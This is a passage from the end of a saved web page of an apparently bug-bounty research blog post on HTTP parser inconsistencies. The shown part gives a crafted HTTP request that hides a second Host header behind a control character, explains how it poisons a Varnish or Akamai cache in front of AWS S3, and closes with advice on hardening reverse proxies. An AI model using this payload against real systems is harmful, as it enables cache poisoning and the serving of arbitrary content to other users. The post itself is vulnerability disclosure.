<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1
[\x1d]Host: evilbucket.com
<span class="hljs-attribute">Host</span>: example.bucket.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<ul>
<li><p>First, the cache server examines the header <code>\x1dHost: evilbucket.com</code> and treats it like any other unkeyed header;</p>
</li>
<li><p>Subsequently, the cache server will correctly interpret the <code>example.bucket.com</code> header as a valid host header, resulting in the final cache response being associated with this host value.</p>
</li>
<li><p>Upon reaching the S3 bucket, the header <code>\x1dHost: evilbucket.com</code> will be mistakenly interpreted as a valid host header, while the intended <code>Host: example.bucket.com</code> header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.</p>
</li>
</ul>
<p>The final result is a complete cache poisoning of the page with arbitrary content.</p>
<p>The proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:</p>
<div class="embed-wrapper"><div class="webembed-wrapper" style="position: relative;overflow: hidden; padding-top: 56.17977528089888%;"><iframe width="100%" height="100%" src="https://www.youtube.com/embed/dnf6Zi5eNW8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" title="HTTP Desync Cache Poisoning on AWS" style="position: absolute; top: 0; left: 0; border: 0;" class="webembed-iframe"></div></iframe></div></div>
<p> </p>
<p>In addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.</p>
<h1 id="heading-conclusion" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-conclusion" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-conclusion" style="height: 48px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Conclusion</h1>
<p>In conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.</p>
<p>I demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.</p>
<p>Moreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.</p>
</div><style>.post-floating-bar {
              bottom: -60px;
            }
            .post-floating-bar.animation {
              -webkit-transition: .2s all;
              -o-transition: .2s all;
              transition: .2s all;
              transition-timing-function: ease-in;
            }
            .post-floating-bar.active {
              bottom: 40px
            }
            .post-floating-bar.freeze {
              bottom: 0!important;
              position: absolute!important;
              transition: none!important;
            }
            .post-floating-bar.freeze > div {
              box-shadow: none!important;
            }
            </style><div class="post-floating-bar fixed left-0 right-0 z-50 flex h-12 w-full flex-wrap justify-center 2xl:h-14 animation"><div class="relative mx-auto flex h-12 shrink flex-wrap items-center justify-center rounded-full border-1/2 border-slate-200 bg-white px-5 py-1 text-sm  text-slate-800 shadow-xl dark:border-slate-500 dark:bg-slate-700 dark:text-slate-50 2xl:h-14"><div class="relative"><style>
          @keyframes slideUpAndFade {
            from {
              opacity: 0;
              transform: translateY(2px);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }

          .reaction-count-tooltip-content {
            box-shadow: hsl(206 22% 7% / 35%) 0px 10px 38px -10px, hsl(206 22% 7% / 20%) 0px 10px 20px -15px;
            user-select: none;
            transition: .2s all;
            animation-duration: 400ms;
            animation-timing-function: cubic-bezier(0.16, 1, 0.3, 1);
            will-change: transform, opacity;
          }
          .reaction-count-tooltip-content[data-state='instant-open'][data-side='top'] {
            animation-name: slideUpAndFade;
          }

          @keyframes shake {
            0% { transform: translateX(0) }
            25% { transform: translateX(1px) }
            50% { transform: translateX(-1px) }
            75% { transform: translateX(1px) }
            100% { transform: translateX(0) }
          }
          .shake {
            animation-name: shake;
            animation-iteration-count: 2;
            animation-duration: 400ms;
            animation-timing-function: cubic-bezier(0.16, 1, 0.3, 1);
            will-change: transform, opacity;
          }
          </style><div class="outline-none! relative flex cursor-pointer items-center"><div class="outline-none! relative flex w-8 cursor-pointer items-center sm:w-10"><button type="button" aria-label="Like this article" class="outline-none absolute z-50 rounded-full p-2 hover:bg-slate-100 focus:outline-none dark:hover:bg-slate-800" data-state="closed"><svg viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6 stroke-current text-slate-800 dark:text-slate-50"><path d="M11 19C12 19 21 14.0002 21 7.00043C21 3.50057 18 1.04405 15 1.00065C13.5 0.978943 12 1.50065 11 3.00059C10 1.50065 8.47405 1.00065 7 1.00065C4 1.00065 1 3.50057 1 7.00043C1 14.0002 10 19 11 19Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></div><div><button type="button" class="outline-none outline-none! text-sm text-slate-800 hover:underline dark:text-slate-200" data-state="closed">43</button></div></div></div><div data-orientation="vertical" aria-orientation="vertical" role="separator" class="my-auto w-px bg-slate-200 dark:bg-slate-600 mx-2 h-5"></div><div data-state="closed" class="outline-none"><button type="button" aria-label="6 comments, open the comments" class="outline-none! flex cursor-pointer items-center rounded-full hover:bg-slate-100 dark:hover:bg-slate-800"><span class="rounded-full p-2"><svg class="h-4 w-4 stroke-current text-slate-800 dark:text-slate-50 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.5 10.6667H9.83333M6.5 7.75H12.3333M9 16.5C13.1421 16.5 16.5 13.1421 16.5 9C16.5 4.85786 13.1421 1.5 9 1.5C4.85786 1.5 1.5 4.85786 1.5 9C1.5 9.99762 1.69478 10.9497 2.04839 11.8204C2.11606 11.9871 2.1499 12.0704 2.165 12.1377C2.17976 12.2036 2.18516 12.2524 2.18517 12.3199C2.18518 12.3889 2.17265 12.4641 2.14759 12.6145L1.65344 15.5794C1.60169 15.8898 1.57582 16.0451 1.62397 16.1573C1.66611 16.2556 1.7444 16.3339 1.84265 16.376C1.95491 16.4242 2.11015 16.3983 2.42063 16.3466L5.38554 15.8524C5.53591 15.8273 5.61109 15.8148 5.68011 15.8148C5.74763 15.8148 5.79638 15.8202 5.86227 15.835C5.92962 15.8501 6.01294 15.8839 6.17958 15.9516C7.05025 16.3052 8.00238 16.5 9 16.5Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span><span class="ml-0.5 pr-2">6</span></button></div><div data-orientation="vertical" aria-orientation="vertical" role="separator" class="my-auto w-px bg-slate-200 dark:bg-slate-600 mx-2 h-5"></div><button class="border border-transparent text-base font-medium leading-relaxed text-slate-700 dark:text-slate-200 disabled:opacity-50 flex flex-row items-center focus:outline-none outline-none rounded-full p-2 hover:bg-slate-100 dark:hover:bg-slate-800" type="button" variant="transparent" aria-label="Open table of contents" data-state="closed"><svg class="h-4 w-4 fill-current text-slate-800 dark:text-slate-50 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6" viewBox="0 0 512 512"><path d="M88 56H40a16 16 0 00-16 16v48a16 16 0 0016 16h48a16 16 0 0016-16V72a16 16 0 00-16-16zm0 160H40a16 16 0 00-16 16v48a16 16 0 0016 16h48a16 16 0 0016-16v-48a16 16 0 00-16-16zm0 160H40a16 16 0 00-16 16v48a16 16 0 0016 16h48a16 16 0 0016-16v-48a16 16 0 00-16-16zm416 24H168a8 8 0 00-8 8v16a8 8 0 008 8h336a8 8 0 008-8v-16a8 8 0 00-8-8zm0-320H168a8 8 0 00-8 8v16a8 8 0 008 8h336a8 8 0 008-8V88a8 8 0 00-8-8zm0 160H168a8 8 0 00-8 8v16a8 8 0 008 8h336a8 8 0 008-8v-16a8 8 0 00-8-8z"></path></svg></button><div data-orientation="vertical" aria-orientation="vertical" role="separator" class="my-auto w-px bg-slate-200 dark:bg-slate-600 mx-2 h-5"></div><button type="button" title="Add Bookmark" aria-label="Add Bookmark" class="outline-none outline-none! flex cursor-pointer items-center" data-state="closed"><span class="rounded-full p-2 hover:bg-slate-100 dark:hover:bg-slate-800"><svg viewBox="0 0 16 20" class="h-4 w-4 scale-[0.97] stroke-current text-slate-800 dark:text-slate-50 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15.2 19V5.8C15.2 4.11984 15.2 3.27976 14.8731 2.63803C14.5854 2.07354 14.1265 1.6146 13.562 1.32698C12.9203 1 12.0802 1 10.4 1H5.60005C3.91989 1 3.07981 1 2.43808 1.32698C1.87359 1.6146 1.41465 2.07354 1.12703 2.63803C0.800049 3.27976 0.800049 4.11984 0.800049 5.8V19L5.85342 16.4733C6.64052 16.0798 7.03406 15.883 7.44686 15.8055C7.81246 15.737 8.18764 15.737 8.55324 15.8055C8.96603 15.883 9.35959 16.0798 10.1467 16.4733L15.2 19Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></button><div id="portal-content"></div><div data-orientation="vertical" aria-orientation="vertical" role="separator" class="my-auto w-px bg-slate-200 dark:bg-slate-600 mx-2 h-5"></div><button type="button" class="outline-none outline-none! hidden cursor-pointer items-center sm:flex" aria-label="Sponsor" data-state="closed"><span class="rounded-full p-2 hover:bg-slate-100 dark:hover:bg-slate-800"><svg viewBox="0 0 22 22" class="h-4 w-4 stroke-current text-slate-800 dark:text-slate-50 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.0001 6.99997C9.3431 6.99997 8.0001 7.89497 8.0001 8.99997C8.0001 10.105 9.3431 11 11.0001 11C12.6571 11 14.0001 11.895 14.0001 13C14.0001 14.105 12.6571 15 11.0001 15M11.0001 6.99997C12.1101 6.99997 13.0801 7.40197 13.5991 7.99997M11.0001 6.99997V5.49997M11.0001 15V16.5M11.0001 15C9.8901 15 8.9201 14.598 8.4011 14M6.56747 3.2279C7.33085 3.16697 8.05556 2.86681 8.63846 2.37013C9.29713 1.8085 10.1344 1.5 11 1.5C11.8656 1.5 12.7029 1.8085 13.3615 2.37013C13.9444 2.86681 14.6692 3.16697 15.4325 3.2279C16.2954 3.29654 17.1055 3.67043 17.7175 4.28247C18.3296 4.89451 18.7035 5.70464 18.7721 6.56747C18.833 7.33085 19.1332 8.05556 19.6299 8.63846C20.1915 9.29713 20.5 10.1344 20.5 11C20.5 11.8656 20.1915 12.7029 19.6299 13.3615C19.1332 13.9444 18.833 14.6692 18.7721 15.4325C18.7035 16.2954 18.3296 17.1055 17.7175 17.7175C17.1055 18.3296 16.2954 18.7035 15.4325 18.7721C14.6692 18.833 13.9444 19.1332 13.3615 19.6299C12.7029 20.1915 11.8656 20.5 11 20.5C10.1344 20.5 9.29713 20.1915 8.63846 19.6299C8.05556 19.1332 7.33085 18.833 6.56747 18.7721C5.70464 18.7035 4.89451 18.3296 4.28247 17.7175C3.67043 17.1055 3.29654 16.2954 3.2279 15.4325C3.16697 14.6692 2.86681 13.9444 2.37013 13.3615C1.8085 12.7029 1.5 11.8656 1.5 11C1.5 10.1344 1.8085 9.29713 2.37013 8.63846C2.86681 8.05556 3.16697 7.33085 3.2279 6.56747C3.29654 5.70464 3.67043 4.89451 4.28247 4.28247C4.89451 3.67043 5.70464 3.29654 6.56747 3.2279Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></button><div data-orientation="vertical" aria-orientation="vertical" role="separator" class="my-auto w-px bg-slate-200 dark:bg-slate-600 mx-2 hidden h-5 sm:block"></div><button type="button" id="radix-:ra:" aria-haspopup="menu" aria-expanded="false" data-state="closed" aria-label="Share this article" class="outline-none outline-none! cursor-pointer rounded-full p-2 hover:bg-slate-100 dark:hover:bg-slate-800"><svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 stroke-current text-slate-800 dark:text-slate-50 sm:h-5 sm:w-5 2xl:h-6 2xl:w-6"><path d="M6.25 7.91667L11.75 5.08333M6.25 10.0833L11.75 12.9167M6.5 9C6.5 10.3807 5.38071 11.5 4 11.5C2.61929 11.5 1.5 10.3807 1.5 9C1.5 7.61929 2.61929 6.5 4 6.5C5.38071 6.5 6.5 7.61929 6.5 9ZM16.5 4C16.5 5.38071 15.3807 6.5 14 6.5C12.6193 6.5 11.5 5.38071 11.5 4C11.5 2.61929 12.6193 1.5 14 1.5C15.3807 1.5 16.5 2.61929 16.5 4ZM16.5 14C16.5 15.3807 15.3807 16.5 14 16.5C12.6193 16.5 11.5 15.3807 11.5 14C11.5 12.6193 12.6193 11.5 14 11.5C15.3807 11.5 16.5 12.6193 16.5 14Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></div></div></div><div class="my-10 mt-20 flex w-full flex-col items-center pb-10 md:px-5"><h2 class="mb-5 text-center font-heading text-2xl font-bold text-slate-900 dark:text-slate-50 md:text-3xl">Subscribe to my newsletter</h2><p class="mb-5 text-center text-lg text-slate-700 dark:text-slate-300 md:w-2/3 md:text-xl">Read articles from <strong>Rafa's Blog</strong> directly inside your inbox. Subscribe to the newsletter, and don't miss out.</p><div class="flex flex-row overflow-hidden rounded-lg border border-slate-800 dark:border-slate-200 md:w-2/3"><input aria-label="Enter your email address" type="email" placeholder="Enter your email address" class="w-full bg-transparent p-3 text-black outline-none dark:text-white md:p-5 md:text-lg" value=""><button class="border border-transparent py-1 text-base leading-relaxed disabled:opacity-50 flex flex-row items-center focus:outline-none shrink-0 rounded-none bg-slate-800 px-3 font-bold uppercase tracking-wide text-white hover:bg-slate-700 dark:bg-slate-200 dark:text-black dark:hover:bg-slate-300 md:px-5" type="button" variant="transparent">Subscribe</button></div></div><div class="blog-sponsor-widget mb-10 flex flex-row items-start rounded-lg border-2 border-slate-200 p-5 dark:border-slate-800 md:items-center md:p-10"><div class="w-2/3"><h3 class="mb-2 font-heading text-2xl font-bold text-slate-900 dark:text-slate-100">Did you find this article valuable?</h3><p class="mb-5 text-lg leading-snug text-slate-600 dark:text-slate-400">Support <strong>Rafael da Costa Santos</strong> by becoming a sponsor. Any amount is appreciated!</p><div><button class="border border-blue-600 text-center transition-colors duration-150 hover:bg-opacity-90 hover:shadow-lg focus:outline-none disabled:opacity-50 mb-5 flex flex-row items-center rounded-lg bg-blue-600 px-4 py-2 text-base font-semibold text-white hover:bg-blue-500" type="button" aria-label="Sponsor author" variant="primary"><svg class="mr-2 h-6 w-6 fill-current" viewBox="0 0 512 512"><path d="M289.94 249.05l-59.06-16.86c-8.75-2.52-14.88-10.61-14.88-19.7 0-11.3 9.19-20.48 20.47-20.48h36.91c8.24 0 16.08 2.56 22.63 7.32 2.99 2.17 7.22 1.46 9.84-1.16l11.42-11.42c3.5-3.5 2.94-9.22-.99-12.23-12.26-9.41-27.18-14.51-42.9-14.51H272v-24c0-4.42-3.58-8-8-8h-16c-4.42 0-8 3.58-8 8v24h-3.53c-30.59 0-55.13 26.3-52.24 57.48 2.06 22.16 19.06 40.12 40.45 46.22l56.44 16.11c8.75 2.52 14.88 10.61 14.88 19.7 0 11.3-9.19 20.48-20.47 20.48h-36.91c-8.24 0-16.08-2.56-22.63-7.32-2.99-2.17-7.22-1.46-9.84 1.16l-11.42 11.42c-3.5 3.5-2.94 9.21.99 12.23 12.26 9.41 27.18 14.51 42.9 14.51H240v24c0 4.42 3.58 8 8 8h16c4.42 0 8-3.58 8-8v-24h1.36c22.81 0 44.33-13.59 51.72-35.17 10.15-29.65-7.28-59.8-35.14-67.78zM512 256c0-35.5-19.4-68.2-49.6-85.5 9.1-33.6-.3-70.4-25.4-95.5s-61.9-34.5-95.5-25.4C324.2 19.4 291.5 0 256 0s-68.2 19.4-85.5 49.6c-33.6-9.1-70.4.3-95.5 25.4s-34.5 61.9-25.4 95.5C19.4 187.8 0 220.5 0 256s19.4 68.2 49.6 85.5c-9.1 33.6.3 70.4 25.4 95.5 26.5 26.5 63.4 34.1 95.5 25.4 17.4 30.2 50 49.6 85.5 49.6s68.1-19.4 85.5-49.6c32.7 8.9 69.4.7 95.5-25.4 25.1-25.1 34.5-61.9 25.4-95.5 30.2-17.3 49.6-50 49.6-85.5zm-91.1 68.3c5.3 11.8 29.5 54.1-6.5 90.1-28.9 28.9-57.5 21.3-90.1 6.5C319.7 433 307 480 256 480c-52.1 0-64.7-49.5-68.3-59.1-32.6 14.8-61.3 22.2-90.1-6.5-36.8-36.7-10.9-80.5-6.5-90.1C79 319.7 32 307 32 256c0-52.1 49.5-64.7 59.1-68.3-5.3-11.8-29.5-54.1 6.5-90.1 36.8-36.9 80.8-10.7 90.1-6.5C192.3 79 205 32 256 32c52.1 0 64.7 49.5 68.3 59.1 11.8-5.3 54.1-29.5 90.1 6.5 36.8 36.7 10.9 80.5 6.5 90.1C433 192.3 480 205 480 256c0 52.1-49.5 64.7-59.1 68.3z"></path></svg><span>Sponsor</span></button><div class="text-slate-400"><a class="font-medium text-blue-600 dark:text-blue-500" href="https://rafa.hashnode.dev/sponsor">See recent sponsors</a> |&nbsp;<a class="font-medium text-blue-600 dark:text-blue-500" href="https://hashnode.com/sponsors" target="_Blank" rel="noreferrer">Learn more about Hashnode Sponsors</a></div></div></div><div class="flex w-1/3 flex-row items-center justify-end pl-2 text-slate-300 dark:text-slate-600"><svg class="h-28 w-28 fill-current" viewBox="0 0 512 512"><path d="M289.94 249.05l-59.06-16.86c-8.75-2.52-14.88-10.61-14.88-19.7 0-11.3 9.19-20.48 20.47-20.48h36.91c8.24 0 16.08 2.56 22.63 7.32 2.99 2.17 7.22 1.46 9.84-1.16l11.42-11.42c3.5-3.5 2.94-9.22-.99-12.23-12.26-9.41-27.18-14.51-42.9-14.51H272v-24c0-4.42-3.58-8-8-8h-16c-4.42 0-8 3.58-8 8v24h-3.53c-30.59 0-55.13 26.3-52.24 57.48 2.06 22.16 19.06 40.12 40.45 46.22l56.44 16.11c8.75 2.52 14.88 10.61 14.88 19.7 0 11.3-9.19 20.48-20.47 20.48h-36.91c-8.24 0-16.08-2.56-22.63-7.32-2.99-2.17-7.22-1.46-9.84 1.16l-11.42 11.42c-3.5 3.5-2.94 9.21.99 12.23 12.26 9.41 27.18 14.51 42.9 14.51H240v24c0 4.42 3.58 8 8 8h16c4.42 0 8-3.58 8-8v-24h1.36c22.81 0 44.33-13.59 51.72-35.17 10.15-29.65-7.28-59.8-35.14-67.78zM512 256c0-35.5-19.4-68.2-49.6-85.5 9.1-33.6-.3-70.4-25.4-95.5s-61.9-34.5-95.5-25.4C324.2 19.4 291.5 0 256 0s-68.2 19.4-85.5 49.6c-33.6-9.1-70.4.3-95.5 25.4s-34.5 61.9-25.4 95.5C19.4 187.8 0 220.5 0 256s19.4 68.2 49.6 85.5c-9.1 33.6.3 70.4 25.4 95.5 26.5 26.5 63.4 34.1 95.5 25.4 17.4 30.2 50 49.6 85.5 49.6s68.1-19.4 85.5-49.6c32.7 8.9 69.4.7 95.5-25.4 25.1-25.1 34.5-61.9 25.4-95.5 30.2-17.3 49.6-50 49.6-85.5zm-91.1 68.3c5.3 11.8 29.5 54.1-6.5 90.1-28.9 28.9-57.5 21.3-90.1 6.5C319.7 433 307 480 256 480c-52.1 0-64.7-49.5-68.3-59.1-32.6 14.8-61.3 22.2-90.1-6.5-36.8-36.7-10.9-80.5-6.5-90.1C79 319.7 32 307 32 256c0-52.1 49.5-64.7 59.1-68.3-5.3-11.8-29.5-54.1 6.5-90.1 36.8-36.9 80.8-10.7 90.1-6.5C192.3 79 205 32 256 32c52.1 0 64.7 49.5 68.3 59.1 11.8-5.3 54.1-29.5 90.1 6.5 36.8 36.7 10.9 80.5 6.5 90.1C433 192.3 480 205 480 256c0 52.1-49.5 64.7-59.1 68.3z"></path></svg></div></div><div class="mb-5 flex w-full flex-row flex-wrap justify-center md:mb-0"><a class="mb-3 mr-3 rounded-lg border bg-slate-100 px-2 py-1 text-base font-medium text-slate-700 hover:bg-slate-200 dark:border-slate-800 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700" href="https://rafa.hashnode.dev/tag/http?source=tags_bottom_blogs"><span>http</span></a><a class="mb-3 mr-3 rounded-lg border bg-slate-100 px-2 py-1 text-base font-medium text-slate-700 hover:bg-slate-200 dark:border-slate-800 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700" href="https://rafa.hashnode.dev/tag/cybersecurity-1?source=tags_bottom_blogs"><span>#cybersecurity</span></a><a class="mb-3 mr-3 rounded-lg border bg-slate-100 px-2 py-1 text-base font-medium text-slate-700 hover:bg-slate-200 dark:border-slate-800 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700" href="https://rafa.hashnode.dev/tag/research?source=tags_bottom_blogs"><span>research</span></a><a class="mb-3 mr-3 rounded-lg border bg-slate-100 px-2 py-1 text-base font-medium text-slate-700 hover:bg-slate-200 dark:border-slate-800 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700" href="https://rafa.hashnode.dev/tag/web?source=tags_bottom_blogs"><span>web</span></a><a class="mb-3 mr-3 rounded-lg border bg-slate-100 px-2 py-1 text-base font-medium text-slate-700 hover:bg-slate-200 dark:border-slate-800 dark:bg-slate-800 dark:text-slate-100 dark:hover:bg-slate-700" href="https://rafa.hashnode.dev/tag/desync-attacks?source=tags_bottom_blogs"><span>Desync Attacks</span></a></div><div class="mb-5 mt-10 flex flex-col gap-16"><div class="flex-1 px-2"><div class="flex flex-col flex-wrap items-start md:flex-nowrap"><h3 class="mb-4 w-full border-b-1-1/2 pb-2 text-base font-medium tracking-wider text-slate-500 dark:border-slate-800 dark:text-slate-400 ">Written by</h3><div class="flex w-full flex-col gap-12"><div class="flex w-full flex-1 flex-col md:flex-row"><div class="mb-4 flex w-full flex-1 flex-row md:mb-0 "><div class="mr-4 flex flex-row md:mb-0"><a href="https://hashnode.com/@rafax00" class="block h-10 w-10 overflow-hidden rounded-full border dark:border-slate-800 md:h-14 md:w-14"><img class="block" alt="Rafael da Costa Santos" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/qxI_lhzL_(2).gif"></a></div><div class="flex flex-1 flex-col justify-center md:justify-start"><div class="flex flex-row items-center md:mb-1"><h1 class="font-sans text-lg font-semibold text-slate-800 dark:text-slate-100"><a href="https://hashnode.com/@rafax00">Rafael da Costa Santos</a></h1></div><div class="hidden pr-2 md:block"><div class="prose text-slate-600 dark:prose-dark dark:text-slate-300"><p>I'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.</p>
</div></div></div></div><div class="mb-4 block md:hidden"><div class="prose text-slate-600 dark:prose-dark "><p>I'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.</p>
</div></div><div class="flex flex-row items-start"><button type="button" class="author-follow-button tooltip-handle flex flex-row items-center text-center font-normal transition-colors duration-150 rounded-full px-4 py-2 text-sm disabled:opacity-50 disabled:cursor-not-allowed focus:outline-none hover:bg-opacity-90 h-10 border bg-transparent dark:border-slate-800 dark:bg-slate-800 dark:text-slate-300 border-blue-600 text-blue-600 hover:bg-blue-100" data-title="Follow user"><span class="">Follow</span></button></div></div></div></div></div></div></div></section></div><div class="absolute h-px w-px overflow-hidden" id="refNode1" style="top: 100px; left: 100px;">&nbsp;</div><div class="absolute left-0 top-0 h-px w-px overflow-hidden" id="refNode2"></div><div class="absolute z-50 mt-4 hidden"><div class="flex flex-row items-center rounded-lg border border-slate-300 bg-white p-4 text-slate-800 shadow-lg dark:border-white dark:bg-slate-800 dark:text-slate-300"><span class="mr-3 block">Share this</span><a href="https://twitter.com/share?url=https%3A%2F%2Frafa.hashnode.dev%2Fexploiting-http-parsers-inconsistencies&amp;text=%20%40rafax00" class="rounded-full border border-transparent py-1 font-medium text-slate-700 dark:text-slate-200 hover:bg-slate-200 disabled:opacity-50 hover:dark:bg-slate-700 flex flex-row items-center focus:outline-none px-2 text-sm" variant="transparent" target="_blank" rel="noopener"><svg class="h-6 w-6 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.643 13.346L4.26862 4.86856C3.85863 4.32329 4.2478 3.54408 4.93001 3.54431L7.2184 3.54508C7.47633 3.54517 7.71945 3.66557 7.87585 3.87066L12.9065 10.4675M10.643 13.346L5.19311 20.5093M10.643 13.346L15.8028 20.077C15.9588 20.2805 16.2003 20.4001 16.4567 20.4009L18.7925 20.4082C19.4778 20.4104 19.8683 19.6261 19.4536 19.0805L12.9065 10.4675M12.9065 10.4675L18.2181 3.50928" stroke-width="1.5" stroke-linecap="round"></path></svg></a><a href="http://www.reddit.com/submit?title=Exploiting%20HTTP%20Parsers%20Inconsistencies&amp;selftext=true&amp;text=%20https%3A%2F%2Frafa.hashnode.dev%2Fexploiting-http-parsers-inconsistencies" class="rounded-full border border-transparent py-1 font-medium hover:bg-slate-200 disabled:opacity-50 hover:dark:bg-slate-700 flex flex-row items-center focus:outline-none px-2 text-sm text-red-600 dark:text-red-600" variant="transparent" target="_blank" rel="noopener"><svg class="h-6 w-6 fill-current" viewBox="0 0 512 512"><path d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 